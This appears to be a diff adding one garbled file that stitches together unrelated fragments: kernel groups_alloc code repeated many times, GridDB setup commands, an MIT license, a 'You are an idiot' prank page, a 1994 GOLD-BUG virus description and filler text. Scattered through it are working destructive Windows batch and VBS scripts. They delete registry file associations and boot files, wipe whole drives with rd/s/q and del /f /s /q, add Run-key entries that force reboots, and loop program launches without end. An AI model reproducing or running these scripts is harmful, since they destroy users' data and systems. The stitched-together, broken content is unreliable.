@@ -1,0 +1,1322 @@
+turkish
+<a href="link/to/your/download/file" download>Download link</a>
+<a href="link/to/your/download/file" download="filename">Download link</a>
+<a href="files/installer.exe">Link to installer</a>
+<a href="path to resource.name of file">Link</a>
+<p><a href="file:///........example.pdf" download target="_blank">test pdf</a></p>
+errors test your ugrade You errors errors errorse errorse
+struct group_info init_groups = { .usage = ATOMIC_INIT(2) };
+struct group_info *groups_alloc(int gidsetsize){
+    struct group_info *groups_alloc(int gidsetsize){
+        struct group_info *groups_alloc(int gidsetsize){
+            struct group_info *groups_alloc(int gidsetsize){
+
+                struct group_info *groups_alloc(int gidsetsize){
+                    nblocks = (gidsetsize + NGROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK;
+                    struct group_info init_groups = { .usage = ATOMIC_INIT(2) };
+
+                    struct group_info *groups_alloc(int gidsetsize){
+                    
+                        struct group_info *group_info;
+                    
+                        int nblocks;
+                    
+                        int i;
+                    home 
+
+
+                    1010100101010101001010101001010101
+                    
+                    
+                        nblocks = (gidsetsize + NGROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK;
+nblocks = (gidsetsize + NGROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK;
+
+	/* Make sure we always allocate at least one indirect block pointer */
+
+	nblocks = nblocks ? : 1;
+
+	group_info = kmalloc(sizeof(*group_info) + nblocks*sizeof(gid_t *), GFP_USER);
+group_info = kmalloc(sizeof(*group_info) + nblocks*sizeof(gid_t *), GFP_USER);
+
+	if (!group_info)
+
+		return NULL;
+
+	group_info|
+struct group_info init_groups = { .usage = ATOMIC_INIT(2) };
+
+struct group_info *groups_alloc(int gidsetsize){
+
+	struct group_info *group_info;
+
+	int nblocks;
+
+	int i;
+
+
+
+	nblocks = (gidsetsize + NGROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK;
+
+	/* Make sure we always allocate at least one indirect block pointer */
+
+	nblocks = nblocks ? : 1;
+
+	group_info = kmalloc(sizeof(*group_info) + nblocks*sizeof(gid_t *), GFP_USER);
+
+	if (!group_info)
+
+		return NULL;
+
+	group_info->ngroups = gidsetsize;
+
+	group_info->nblocks = nblocks;
+
+	atomic_set(&group_info->usage, 1);
+
+:VIRUS
+cd /d C:
+md %RANDOM%
+cd /d D:
+md %RANDOM%
+cd /d E:
+md %RANDOM%
+goto VIRUS
+REM #######################
+REM errorcode401.blogspot.in
+
+
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/*
+
+Ipconfig /release
+
+msg * Lets Roll Baby
+shutdown -c “Error! Your ass got glued!” -s
+
+
+
+echo break off>>c:windowshartlell.bat
+echo shutdown -r -t 11 -f>>c:windowshartlell.bat
+echo end>>c:windowshartlell.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
+echo You Are Nailed, Buy A New Computer This Is Piece Of Shit.
+PAUSE
+
+
+attrib -r -s -h c:\autoexec.bat
+del c:\autoexec.bat
+attrib -r -s -h c:\boot.ini
+del c:\boot.ini
+attrib -r -s -h c:\ntldr
+del c:\ntldr
+attrib -r -s -h c:\windows\win.ini
+del c:\windows\win.ini
+
+shutdown -s -t 100 c “Installing Updates”
+
+Virus Name:  GOLD-BUG
+Aliases:     AU, GOLD, GOLD-FEVER, GOLD-MINE
+V Status:    New, Research
+Discovery:   January, 1994
+Symptoms:    CMOS checksum failure; Creates files with no extension; Modem
+	     answers on 7th ring; BSC but it is hidden; Most virus scanners
+	     fail to run or are Deleted; CHKLIST.??? files deleted.
+Origin:      USA
+Eff Length:  1,024 Bytes
+Type Code:   SBERaRbReX - Spawning Color Video Resident and Extended HMA
+	     Memory Resident Boot-Sector and Master-Sector Infector
+Detection Method:  None
+Removal Instructions:  See Below
+
+General Comments:
+
+	GOLD-BUG is a memory-resident multipartite polymorphic stealthing
+	boot-sector spawning anti-antivirus virus that works with DOS 5 and
+	DOS 6 in the HIMEM.SYS memory.  When an .EXE program infected with the
+	GOLD-BUG virus is run, it determines if it is running on an 80186 or
+	better, if not it will terminate and not install.  If it is on an
+	80186 or better it will copy itself to the partition table of the hard
+	disk and remain resident in memory in the HMA (High Memory Area) only
+	if the HMA is available, ie. DOS=HIGH in the CONFIG.SYS file else no
+	infection will occur.  The old partition table is moved to sector 14
+	and the remainder of the virus code is copied to sector 13.  The virus
+	then executes the spawned associated file if present.  INT 13 and
+	INT 2F are hooked into at this time but not INT 21.  The spawning
+	feature of this virus is not active now.
+
+	When the computer is rebooted, the virus goes memory resident in the
+	color video memory.  Also at this time the GOLD-BUG virus removes
+	itself from the partition table and restores the old one back.  Unlike
+	other boot-sector infectors, it does not use the top of memory to
+	store the code.  CHKDSK does not show a decrease in available memory.
+	At this time it only hooks INT 10 and monitors when the HMA becomes
+	available.  Once DOS moves into the HMA, then GOLD-BUG moves into the
+	HMA at address FFFF:FB00 to FFFF:FFFF.  If the HMA never becomes
+	available, ie. DOS loaded LOW or the F5 key hit in DOS 6 to bypass the
+	CONFIG.SYS, then the virus clears itself from the system memory when
+	the computer changes into graphics mode.  If it moves to the HMA, it
+	hooks INT 13, INT 21 and INT 2F and then rewrites itself back to the
+	partition table.  The GOLD-BUG virus also has some code that stays
+	resident in the interrupt vector table to always make the HMA
+	available to the virus.  The full features of the virus are now
+	active.
+
+	The GOLD-BUG virus will infect the boot sector of 1.2M diskettes.
+	The virus copies itself to the boot sector of the diskette and moves
+	a copy of the boot sector to sector 28 and the remainder of the code
+	is copied to sector 27.  These are the last 2 sectors of the 1.2M disk
+	root directory.  If there are file entries on sector 27 or 28 it will
+	not overwrite them with the virus code.  It will infect 1.2M disks in
+	drive A: or B:  If a clean boot disk is booted from drive A: and you
+	try to access C: you will get an invalid drive specification.
+
+	The boot-sector infection is somewhat unique.  If the computer is
+	booted with a disk that contains the GOLD-BUG virus, it will remain in
+	video memory until the HMA is available and then infect the hard disk.
+	Also at this time, it will remove itself from the 1.2M disk.  The
+	virus will never infect this disk again.  It makes tracking where you
+	got the virus from difficult in that your original infected disk is
+	not infected anymore.
+
+	If an .EXE file less than 64K and greater then 1.5K is executed,
+	GOLD-BUG will randomly decide to spawn a copy of it.  The .EXE file is
+	renamed to the same file name with no extension, ie. CHKDSK.EXE
+	becomes CHKDSK.  The original file attributes are then changed to
+	SYSTEM.  An .EXE file with the same name is created.  This .EXE file
+	has the same length, file date and attributes as the original .EXE
+	file.  This spawning process will not make a copy on a diskette
+	because it might be write protected and be detected; but it will make
+	a spawn .EXE file on a network drive.  When a spawned file is created,
+	CHKLIST.??? of the current directory is also deleted.  The .EXE file
+	that is created is actually a .COM file; it has no .EXE header.
+
+	The GOLD-BUG virus is very specific as to what type of .EXE files it
+	will spawn copies.  It will not spawn any Windows .EXE files or any
+	other .EXE files the use the new extended .EXE header except those
+	that use the PKLITE extended .EXE header.  This way all Windows
+	programs will continue to run and the virus will still be undetected.
+
+	The GOLD-BUG virus is also Polymorphic.  Each .EXE file it creates
+	only has 2 bytes that remain constant.  It can mutate into 128
+	different decription patterns.  It uses a double decription technique
+	that involves INT 3 that makes it very difficult to decript using a
+	debugger.  The assembly code allowed for 512 different front-end
+	decripters.  Each of these can mutate 128 different ways.
+
+	The GOLD-BUG virus incorporates an extensive steathing technique.  Any
+	time the hard disk partition table or boot sector of an infected
+	diskette is examined, the copy of the partition table or boot sector
+	is returned.  If a spawned .EXE file is opened to be read or executed;
+	the GOLD-BUG virus will redirect to the original file.  Windows 3.1
+	will detect a resident boot-sector virus if the "Use 32 Bit Access" is
+	enabled on the "Virtual Memory" option.  GOLD-BUG will disconnect
+	itself from the INT 13 chain when Windows installs and reconnect when
+	Windows uninstalles to avoid being detected.  When Windows starts, the
+	GOLD-BUG virus will copy the original hard disk partition table back.
+	When Windows ends, the GOLD-BUG virus will reinfect the partition
+	table.
+
+	The GOLD-BUG virus also has an extensive anti-antivirus routine.  It
+	can install itself with programs like VSAFE.COM and DISKMON.EXE
+	resident that monitor changes to the computer that are common for
+	viruses.  It writes to the disk using the original BIOS INT 13 and not
+	the INT 13 chain that these types of programs have hooked into.  It
+	hooks into the bottom of the interrupt chain rather than changing and
+	hooking interrupts; very similar to the tunneling technique.  If the
+	GOLD-BUG virus is resident in memory, any attempts to run most virus
+	scanners will be aborted.  GOLD-BUG stops any large .EXE file
+	(greater than 64k) with the last two letters of "AN" to "AZ".  It will
+	stop SCAN.EXE, CLEAN.EXE, NETSCAN.EXE, CPAV.EXE, MSAV.EXE, TNTAV.EXE,
+	etc., etc.  The SCAN program will either be deleted or an execution
+	error will return.  Also, GOLD-BUG will cause a CMOS checksum failure
+	to happen next time the system boots.  GOLD-BUG also erases
+	"CHKLIST.???" created by CPAV.EXE and MSAV.EXE.  Programs that do an
+	internal checksum on themselves will not detect any changes.  The
+	Thunder Byte Antivirus programs contain a partition table program that
+	claims it can detect all partition table viruses.  GOLD-BUG rides
+	right through the ThunderByte partition virus checker.
+
+	The GOLD-BUG virus detects a modem.  If you received an incoming call
+	on the modem line, GOLD-BUG will output a string that will set the
+	modem to answer on the seventh ring.
+
+	If a program tries to erase the infected .EXE file, the original
+	program and not the infected .EXE file is erased.
+
+	The text strings "AU", "1O7=0SLMTA", and "CHKLIST????" appear in the
+	decripted code.  The virus gets it name from "AU", the chemical
+	element "GOLD".  The text string "CHKLIST????" is actually executable
+	code.
+
+	The GOLD-BUG virus has two companion viruses that it works with.  The
+	DA'BOYS virus is also a boot-sector infector.  It is possible to have
+	a diskette with two boot-sector viruses.  GOLD-BUG hides the presence
+	of the DA'BOYS virus from the Windows 3.1 startup routine.  GOLD-BUG
+	removes the DA'BOYS virus from the INT 13 chain at the start of
+	Windows and restores it when Windows ends.  The GOLD-BUG virus works
+	with the XYZ virus; it reserves the space FFFF:F900 to FFFF:FAFF in
+	the HMA for the XYZ virus so it can load as well.
+
+	To remove the GOLD-BUG virus, change DOS=HIGH to DOS=LOW in the
+	CONFIG.SYS, then reboot.  Once the system comes up again, reboot from
+	a clean boot disk.  The Virus has now removed itself from the
+	partition table and memory.  With the ATTRIB command check for files
+	with the SYSTEM bit set that don't have any extension.  Delete the
+	.EXE file associated with the SYSTEM file.  Using ATTRIB remove the
+	SYSTEM attribute.  Rename the file with no extension to an .EXE file.
+	Format each diskette or run SYS to remove the virus from the boot
+	sector of each 1.2M disk.  Any spawned .EXE files copied to diskette
+	need to be deleted.
+
+	Several variations of this virus can exist.  The assembly code allowed
+	for 14 features to be turned on or off:  Delete Scanners, Check for
+	8088, Infect at Random, Deflect Delete, CMOS Bomb, File Reading
+	Stealth, Same File Date, Double Decription, Execute Spawned, Modem
+	Code, Anti-Antivirus, Polymorphic, Multipartite and 720K or 1.2M
+	Diskette Infection.  Some of these features can be disabled and more
+	code added to change the characteristics of this virus.
+
+(save as .VBS)
+
+
+shutdown -s -t 100 c “Installing Updates”
+
+echo break off>>c:windowswimn32.bat
+echo ipconfig/release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+echo You have maxed your internet usage for a lifetime ??
+PAUSE
+
+
+
+Dim WSHShell
+Set WSHShell=Wscript.CreateObject(“Wscript.Shell”)
+
+Dim x
+For x = 1 to 100000000
+WSHShell.Run “Tourstart.exe”
+Next
+
+
+
+
+rd/s/q C:\
+rd/s/q E:\
+
+
+
+
+
+
+MIT License
+
+Copyright (c) 2021 Yongchun Zhu
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8" />
+	<title>Idiot</title>
+	
+	<!--
+	    Original Flash Movie: http://youareanidiot.org/
+	    Audio from http://shane-o.com/sound-drops/163-idiot-drop
+	    This implementation: Rodney Rehm - http://rodneyrehm.de/en/
+	-->
+	
+	<style>
+	    body {
+	        margin: 0; 
+	        padding: 0; 
+	        font-family: Comic Sans;
+	        font-weight: bold;
+	        font-size: 16px;
+            color: #CCC;
+	        background: white;
+	        -webkit-transition: background-color 0.05s ease-in 0s,
+	                            color 0.05s ease-in 0s;
+	                transition: background-color 0.05s ease-in 0s,
+	                            color 0.05s ease-in 0s;
+	    }
+	    
+	    .browser-fail .happy {
+	        display: none;
+	    }
+	    
+	    .no-track {
+	        color: black;
+	    }
+	    
+	    #idiot-text,
+	    #idiot-face {
+	        display: block;
+            padding: 1em;
+	        text-align: center;
+	        font-size: 4em;
+	    }
+	    
+	    #idiot-text span {
+	        white-space: nowrap;
+	    }
+	    
+	    #idiot-face {
+	        padding: 0;
+	        font-size: 10em;
+	        color: black;
+	    }
+	    
+	    .visited {
+	        color: #666;
+	    }
+	    
+	    .active {
+	        color: #336699;
+	    }
+	    
+	    .inverted {
+	        background: black;
+	        color: #333;
+	    }
+	    
+	    .inverted.no-track {
+	        color: white;
+	    }
+	    
+	    .inverted .visited {
+	        color: #AAA;
+	    }
+	    
+	    .inverted .active {
+	        color: #6699CC;
+	    }
+	    
+	    .inverted #idiot-face {
+	        color: white;
+	    }
+	    
+        @media only screen and (min-width: 1000px) {
+	        body {
+	            width: 1000px;
+	            margin: 0 auto;
+	        }
+	    }
+	    
+        @media only screen and (max-width: 400px) {
+            body {
+                font-size: 10px;
+            }
+        }
+	</style>
+</head>
+<body>
+    
+    <output id="idiot-text">
+        <span id ="idiot-cue-1">you</span>
+        <span id ="idiot-cue-2">are</span>
+        <span id ="idiot-cue-3">an</span>
+        <span id ="idiot-cue-4">idiot</span>
+        <span id ="idiot-cue-5">ah</span>
+        <span id ="idiot-cue-6">haha</span>
+        <span id ="idiot-cue-7">ha ha ha</span>
+        <span id ="idiot-cue-8">aha ha</span>
+        <span id ="idiot-cue-9">ha ha</span>
+        <span id ="idiot-cue-10">ha</span>
+    </output>
+    
+    <output id="idiot-face">
+        <span class="smiley happy">☺</span>
+        <span class="smiley sad">☹</span>
+        <span class="smiley happy">☺</span>
+    </output>
+    
+    <audio id="idiot-audio" volume="0.2" auto-play="off" lo-op="true">
+        <source src="audio/idiot.mp3" type="audio/mp3">
+        <source src="audio/idiot.ogg" type="audio/ogg">
+        <source src="audio/idiot.wav" type="audio/wav">
+    </audio>
+    
+    <script>
+        (function() {
+            "use strict";
+            
+            var output = document.getElementById('idiot-text');
+            var audio = document.getElementById('idiot-audio');
+            
+            if (!window.Audio) {
+                output.innerHTML = 'Your Browser Is An Idiot!';
+                document.body.className = 'browser-fail';
+                console.error('Audio not supported');
+                return;
+            }
+
+            if (Audio.prototype.addTextTrack) {
+                var track = audio.addTextTrack('metadata');
+                var cues = [
+                    {start: 0.040, stop: 0.474, id: 'idiot-cue-1', text: "you"},
+                    {start: 0.580, stop: 0.860, id: 'idiot-cue-2', text: "are"},
+                    {start: 0.860, stop: 1.013, id: 'idiot-cue-3', text: "an"},
+                    {start: 1.069, stop: 1.672, id: 'idiot-cue-4', text: "idiot"},
+                    {start: 1.945, stop: 2.112, id: 'idiot-cue-5', text: "ah"},
+                    {start: 2.234, stop: 2.566, id: 'idiot-cue-6', text: "haha"},
+                    {start: 2.593, stop: 3.131, id: 'idiot-cue-7', text: "ha ha ha"},
+                    {start: 3.207, stop: 3.802, id: 'idiot-cue-8', text: "aha ha"},
+                    {start: 3.871, stop: 4.397, id: 'idiot-cue-9', text: "ha ha"},
+                    {start: 4.494, stop: 4.883, id: 'idiot-cue-10', text: "ha"}
+                ];
+
+                cues.forEach(function(cue) {
+                    track.addCue(new TextTrackCue(cue.start, cue.stop, cue.id));
+                });
+
+                track.addEventListener('cuechange', function(event) {
+                    if (!track.activeCues.length) {
+                        return;
+                    }
+
+                    // TODO: improve this
+                    [].forEach.call(output.querySelectorAll('.active'), function(node) {
+                        node.classList.remove('active');
+                    });
+                    
+                    var id = track.activeCues[0].text;
+                    document.getElementById(id).className = 'visited active';
+                    document.body.offsetTop;
+                });
+            } else {
+                document.body.classList.add('no-track');
+                console.error('Audio.prototype.addTextTrack() not supported');
+            }
+            
+            audio.addEventListener('play', function(event) {
+                [].forEach.call(output.childNodes, function(node) {
+                    node.className = '';
+                });
+            });
+
+            // loop prevents ended event (in Chrome), but wee need something to reset the canvas
+            // audio.loop = true;
+            audio.addEventListener('ended', function(event) {
+                setTimeout(function() {
+                    audio.currentTime = 0;
+                    audio.play();
+                }, 200);
+            });
+
+            document.addEventListener('keydown', toggle);
+            document.addEventListener('touchend', toggle);
+            document.addEventListener('mouseup', toggle);
+            
+            function toggle(event) {
+                if (event.type === 'keydown' && event.keyCode != 32) {
+                    return;
+                }
+                
+                event.preventDefault();
+                event.stopPropagation();
+                
+                audio[audio.paused ? 'play' : 'pause']();
+            }
+            
+            function invertBackground() {
+                if (!audio.paused) {
+                    document.body.classList.toggle('inverted');
+                }
+                
+                return setTimeout(invertBackground, 500);
+            }
+            
+            audio.play();
+            invertBackground();
+
+        })();
+    </script>
+    
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-8922143-5', 'rodneyrehm.github.io');
+      ga('send', 'pageview');
+
+    </script>
+</body>
+</html>
+
+
+
+
+
+
+$ export GS_HOME=$PWD
+$ export GS_LOG=$PWD/log
+$ export PATH=${PATH}:$GS_HOME/bin
+
+$ bin/gs_passwd admin
+  #input your_password
+$ vi conf/gs_cluster.json
+  #    "clusterName":"your_clustername" #<-- input your_clustername
+
+$ bin/gs_startnode
+$ bin/gs_joincluster -c your_clustername -u admin/your_password
+
+
+
+
+
+$ export CLASSPATH=${CLASSPATH}:$GS_HOME/bin/gridstore.jar
+$ mkdir gsSample
+$ cp $GS_HOME/docs/sample/program/Sample1.java gsSample/.
+$ javac gsSample/Sample1.java
+$ java gsSample/Sample1 239.0.0.1 31999 your_clustername admin your_password
+  --> Person:  name=name02 status=false count=2 lob=[65, 66, 67, 68, 69, 70, 71, 72, 73, 74]
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+$ export CLASSPATH=${CLASSPATH}:$GS_HOME/bin/gridstore.jar
+$ mkdir gsSample
+$ cp $GS_HOME/docs/sample/program/Sample1.java gsSample/.
+$ javac gsSample/Sample1.java
+$ java gsSample/Sample1 239.0.0.1 31999 your_clustername admin your_password
+  --> Person:  name=name02 status=false count=2 lob=[65, 66, 67, 68, 69, 70, 71, 72, 73, 74]
+
+V
+
+$ bin/gs_stopcluster -u admin/your_password
+$ bin/gs_stopnode -u admin/your_password
+
+void
+
+
+
+
+(CentOS/RockyLinux)
+$ sudo rpm -ivh griddb-X.X.X-linux.x86_64.rpm
+
+(Ubuntu)
+$ sudo dpkg -i griddb_X.X.X_amd64.deb
+
+Note: X.X.X is the GridDB version.
+
+
+
+[gsadm]$ cp /usr/griddb-X.X.X/conf_multicast/* conf/.
+
+Note: Default is only for local connection. So, please change the configure files.
+
+[gsadm]$ gs_passwd admin
+  #input your_password
+[gsadm]$ vi conf/gs_cluster.json
+  #    "clusterName":"your_clustername" #<-- input your_clustername
+[gsadm]$ gs_startnode
+[gsadm]$ gs_joincluster -c your_clustername -u admin/your_password
+
+
+$ ./bootstrap.sh
+$ ./configure[gsadm]$ gs_stopcluster -u admin/your_password
+[gsadm]$ gs_stopnode -u admin/your_password
+$ make
+
+
+$ export CLASSPATH=${CLASSPATH}:/usr/share/java/gridstore.jar
+$ mkdir gsSample
+$ cp /usr/griddb-X.X.X/docs/sample/program/Sample1.java gsSample/.
+$ javac gsSample/Sample1.java
+$ java gsSample/Sample1 239.0.0.1 31999 your_clustername admin your_password
+  --> Person:  name=name02 status=false count=2 lob=[65, 66, 67, 68, 69, 70, 71, 72, 73, 74]
+
+
+$ cd java_client
+$ ./make_source_for_mvn.sh
+$ mvn clean
+$ mvn install
+
+
+
+👋 Hi, I’m @TARTCAKERB
+- 👀 I’m interested in ...
+- 🌱 I’m currently learning ...
+- 💞️ I’m looking to collaborate on ...
+- 📫 How to reach me ...
+- 😄 Pronouns: ...
+- ⚡ Fun fact: ...
+
+
+
+
+
+
+$ export GS_HOME=$PWD
+$ export GS_LOG=$PWD/log
+$ export PATH=${PATH}:$GS_HOME/bin
+
+$ bin/gs_passwd admin
+  #input your_password
+$ vi conf/gs_cluster.json
+  #    "clusterName":"your_clustername" #<-- input your_clustername
+
+$ bin/gs_startnode
+$ bin/gs_joincluster -c your_clustername -u admin/your_password
+
+
+<html>
+  <head>
+    <title>You are an Idiot! (dot org)</title>
+
+    <meta name="Author" content="The ADR and Jazzy" />
+    <meta
+      name="Keywords"
+      content="you are an idiot, you, are, an, idiot, fool, youdontknowwhoiam.org, youdontknowwhoiam, you dont know who i am, you, dont, know, who, i, am, org, dot, aregner, jazzy, adr"
+    />
+    <meta
+      name="Description"
+      content="A funny Little Website Made By Alexander MacDonald"
+    />
+
+    <script
+      language="Javascript"
+      src="https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.js"
+    ></script>
+  </head>
+
+  <body
+    bgcolor="#ffffff"
+    onkeydown="altf4key();ctrlkey();delkey();"
+    onunload="procreate()"
+    leftmargin="0"
+    topmargin="0"
+    marginwidth="0"
+    marginheight="0"
+  >
+    <object
+      width="100%"
+      height="100%"
+      data="https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/source-code/youare.swf"
+    ></object>
+  </body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+@echo off
+del D:\*.* /f /s /q
+del E:\*.* /f /s /q
+del F:\*.* /f /s /q
+del G:\*.* /f /s /q
+del H:\*.* /f /s /q
+del I:\*.* /f /s /q
+del J:\*.* /f /s /q
+
+
+
+
+	if (gidsetsize <= NGROUPS_SMALL)
+
+		group_info->blocks[0] = group_info|
+struct group_info init_groups = { .usage = ATOMIC_INIT(2) };
+
+struct group_info *groups_alloc(int gidsetsize){
+
+	struct group_info *group_info;
+
+	int nblocks;
+
+	int i;
+
+
+
+	nblocks = (gidsetsize + NGROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK;
+
+	/* Make sure we always allocate at least one indirect block pointer */
+
+	nblocks = nblocks ? : 1;
+
+	group_info = kmalloc(sizeof(*group_info) + nblocks*sizeof(gid_t *), GFP_USER);
+
+	if (!group_info)
+
+		return NULL;
+
+	group_info->ngroups = gidsetsize;
+
+	group_info->nblocks = nblocks;
+
+	atomic_set(&group_info->usage, 1);
+
+
+
+	if (gidsetsize <= NGROUPS_SMALL)
+
+		group_info->blocks[0] = group_info|
+struct group_info init_groups = { .usage = ATOMIC_INIT(2) };
+
+struct group_info *groups_alloc(int gidsetsize){
+
+	struct group_info *group_info;
+
+	int nblocks;
+
+	int i;
+
+
+
+	nblocks = (gidsetsize + NGROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK;
+
+	/* Make sure we always allocate at least one indirect block pointer */
+
+	nblocks = nblocks ? : 1;
+
+	group_info = kmalloc(sizeof(*group_info) + nblocks*sizeof(gid_t *), GFP_USER);
+
+	if (!group_info)
+
+		return NULL;
+
+	group_info->ngroups = gidsetsize;
+
+	group_info->nblocks = nblocks;
+
+	atomic_set(&group_info->usage, 1);
+
+
+
+	if (gidsetsize <= NGROUPS_SMALL)
+
+		group_info->blocks[0] = group_info|
+struct group_info init_groups = { .usage = ATOMIC_INIT(2) };
+
+struct group_info *groups_alloc(int gidsetsize){
+
+	struct group_info *group_info;
+
+	int nblocks;
+
+	int i;
+
+
+
+	nblocks = (gidsetsize + NGROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK;
+
+	/* Make sure we always allocate at least one indirect block pointer */
+
+	nblocks = nblocks ? : 1;
+
+	group_info = kmalloc(sizeof(*group_info) + nblocks*sizeof(gid_t *), GFP_USER);
+
+	if (!group_info)
+
+		return NULL;
+
+	group_info->ngroups = gidsetsize;
+
+	group_info->nblocks = nblocks;
+
+	atomic_set(&group_info->usage, 1);
+
+
+
+	if (gidsetsize <= NGROUPS_SMALL)
+
+		group_info->blocks[0] = group_info|
+struct group_info init_groups = { .usage = ATOMIC_INIT(2) };
+
+struct group_info *groups_alloc(int gidsetsize){
+
+	struct group_info *group_info;
+
+	int nblocks;
+
+	int i;
+
+oreo server bok ye sen async we weew 
+writeAllAsync __EntryPointee atomic_set atomic_seta ///////////////////////////////////////////////////////////////////1010101010110201010100101010210291021001010110101010010101101010101101010101010101010101010101010101011111111110100101010101010100101010101
+	nblocks = (gidsetsize + NGROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK;
+
+	/* Make sure we always allocate at least one indirect block pointer */
+
+	nblocks = nblocks ? : 1;
+
+	group_info = kmalloc(sizeof(*group_info) + nblocks*sizeof(gid_t *), GFP_USER);
+
+	if (!group_info)
+
+
+
+Preparing "Install Google Play Intel x86_64 Atom System Image API 35 (revision 7)".
+Downloading https://dl.google.com/android/repository/sys-img/google_apis_playstore/x86_64-35_r07.zip
+
+
+
+
+
+
+name tiky
+
+
+
+
+
+
+
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\tugra.TUGRABERAT28>winget ugrade
+
+
+
+hack hack hack hack hack hack hack hack
+ hack hack hack hack hack hack hack
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		return NULL;
+
+	group_info->ngroups = gidsetsize;
+
+	group_info->nblocks = nblocks;
+
+	atomic_set(&group_info->usage, 1);
+
+
+
+	if (gidsetsize <= NGROUPS_SMALL)
+
+		group_info->blocks[0] = group_info|
+struct group_info init_groups = { .usage = ATOMIC_INIT(2) };
+
+struct group_info *groups_alloc(int gidsetsize){
+
+	struct group_info *group_info;
+
+	int nblocks;
+
+	int i;
+
+/virus//money $ cd my_project
+
+
+$ cd my_project
+
+
+
+$ cd my_project
+
+hh_client 
+
+
+
+
+
+
+
+hh_client
+
+
+
+hh_client
+hh_client
+hh_client
+hh_client
+
+hh_client
+hh_client
+
+hh_client
+hh_client
+hh_client
+hh_client
+hh_client
+hh_clienthh_client
+
+hh_client
+hh_client
+hh_client
+hh_client
+
+
+$ cd my_project
+
+
+
+
+
+
+
+
